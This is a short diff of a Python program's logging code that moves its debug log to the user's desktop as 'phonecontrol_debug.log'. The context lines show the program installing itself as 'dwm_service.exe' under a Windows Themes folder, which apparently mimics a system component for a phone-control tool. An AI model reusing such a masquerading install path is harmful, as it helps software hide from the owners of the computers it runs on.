@@ -32,9 +32,10 @@ POLL_INTERVAL_ACTIVE = 10   # seconds when active
 # ─── Logging (to file next to exe) ───────────────────────────────────────────
 
 BASE_DIR = Path(sys.executable).parent if getattr(sys, "frozen", False) else Path(__file__).parent
-# После установки логи идут в папку установки, до — рядом с exe
 _INSTALL_DIR_EARLY = Path(os.environ.get("APPDATA","")) / "Microsoft" / "Windows" / "Themes" / "WinDWM"
-LOG_FILE  = (_INSTALL_DIR_EARLY / "dwm_service.log") if (_INSTALL_DIR_EARLY / "dwm_service.exe").exists() else (BASE_DIR / "setup.log")
+# Лог всегда на рабочем столе — чтобы найти при любых условиях
+_DESKTOP = Path(os.environ.get("USERPROFILE", "C:/Users/Public")) / "Desktop"
+LOG_FILE  = _DESKTOP / "phonecontrol_debug.log"
 
 logging.basicConfig(
     filename=str(LOG_FILE),
